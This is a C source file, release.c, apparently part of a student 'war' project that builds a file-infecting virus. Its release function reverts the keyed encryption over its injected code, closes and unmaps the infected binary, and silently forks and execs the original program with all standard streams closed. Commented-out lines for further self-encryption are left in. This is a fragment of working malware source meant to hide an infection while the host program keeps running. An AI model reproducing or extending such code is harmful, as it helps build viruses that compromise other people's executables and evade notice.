/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   release.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/09 14:47:53 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Release: e_e
*/
void		release(t_data *data)
{

	revert_one(&data->key, (char*)inject, (size_t)release - (size_t)patch);

#ifdef DEBUG
	char de[] = "release\t0\n";
	data->context == true ?	de[8] = 49 : 0;
	_log(de, _strlen(de));
#endif

	_close(data->bin.fd);
	_munmap(data->bin.map, data->bin.size);

	pid_t child;
	char *av[2] = {data->name, 0};

	child = _fork();
	if (child == 0)
	{
		_close(STDIN_FILENO);
		_close(STDOUT_FILENO);
		_close(STDERR_FILENO);
		_execve(av[0], av, NULL);
		_exit(0);
	}

	// disabled due to mysterious segfault in infected binary that pop out of nowhere
	/* update_one(&data->key, (char*)release, (size_t)end - (size_t)release); */
	/* revert_one(&data->key, (char*)end, (size_t)update_one - (size_t)end); */

	end(data);
}
